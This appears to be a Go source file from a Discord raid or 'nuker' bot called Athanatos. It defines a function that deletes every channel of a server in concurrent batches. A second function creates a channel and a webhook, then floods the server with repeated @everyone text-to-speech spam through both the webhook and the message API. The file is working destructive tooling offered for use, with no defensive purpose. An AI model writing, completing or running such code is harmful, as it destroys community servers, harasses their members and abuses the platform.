package creating

import (
	"Athanatos/core/requests"
	"encoding/json"
	"fmt"
	"os"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

func DeleteChannels(s *discordgo.Session, channels []*discordgo.Channel) {
	smoothed := requests.Smooth(channels)
	for _, ch := range smoothed {
		wg := new(sync.WaitGroup)
		wg.Add(len(ch))
		for _, channel := range ch {
			go func(ch *discordgo.Channel) {
				defer wg.Done()
				s.ChannelDelete(ch.ID)
			}(channel)
		}
		wg.Wait()
		time.Sleep(time.Second)
	}
}

func TextSpam(s *discordgo.Session, m *discordgo.MessageCreate, wg *sync.WaitGroup, username string, avatarurl string) {
	godotenv.Load()

	CHANNEL_NAME := os.Getenv("CHANNEL_NAME")
	EMBED_DESCRIPTION := os.Getenv("EMBED_DESCRIPTION")
	EMBED_TITLE := os.Getenv("EMBED_TITLE")
	AVATAR_URL := os.Getenv("AVATAR_URL")

	guild, err := s.State.Guild(m.GuildID)
	if err != nil {
		fmt.Println("Error getting guild: ", err)
		return
	}

	thumbnail := discordgo.MessageEmbedThumbnail{
		URL: AVATAR_URL,
	}

	embed := discordgo.MessageEmbed{
		Title:       EMBED_TITLE,
		Description: EMBED_DESCRIPTION + "\n\n" + "> **Bot joined at: ** " + "`" + fmt.Sprint(guild.JoinedAt) + "`\n\n",
		Color:       16777215,
		Thumbnail:   &thumbnail,
	}

	dataMsg := discordgo.MessageSend{
		Content: "@everyone",
		Embeds:  []*discordgo.MessageEmbed{&embed},
		TTS:     true,
	}

	dataHookMsg := discordgo.WebhookParams{
		Username:  username,
		AvatarURL: avatarurl,
		Content:   "@everyone",
		Embeds:    []*discordgo.MessageEmbed{&embed},
		TTS:       true,
	}

	dataMap := map[string]string{"name": string(CHANNEL_NAME), "type": "0"}
	jsonData, _ := json.Marshal(dataMap)

	data := requests.Sendhttp("https://discord.com/api/v9/guilds/"+m.GuildID+"/channels", "POST", jsonData)

	time.Sleep(time.Second)

	type ResponseData struct {
		ID string `json:"id"`
	}

	var responseData ResponseData
	err = json.Unmarshal([]byte(data), &responseData)
	if err != nil {
		fmt.Println("There's an error while decoding JSON:", err)
		return
	}
	dataHook := map[string]any{
		"name": "hook",
	}

	hookData, _ := json.Marshal(dataHook)
	createdHook := requests.Sendhttp("https://discord.com/api/v9/channels/"+responseData.ID+"/webhooks", "POST", hookData)

	type ResponseDataHook struct {
		URL string `json:"url"`
	}

	var responseDataHook ResponseDataHook

	err2 := json.Unmarshal([]byte(createdHook), &responseDataHook)
	if err2 != nil {
		fmt.Println("There's an error while decoding JSON:", err2)
		return
	}

	jsonData, _ = json.Marshal(dataMsg)
	hookData, _ = json.Marshal(dataHookMsg)

	for i := 0; i < 7; i++ {
		//wg.Add(1)
		go func() {
			//defer wg.Done()
			requests.Sendhttp(responseDataHook.URL, "POST", hookData)
			requests.Sendhttp(responseDataHook.URL, "POST", hookData)

			requests.Sendhttp("https://discord.com/api/v9/channels/"+responseData.ID+"/messages", "POST", jsonData)
		}()
		time.Sleep(time.Second)

	}
}
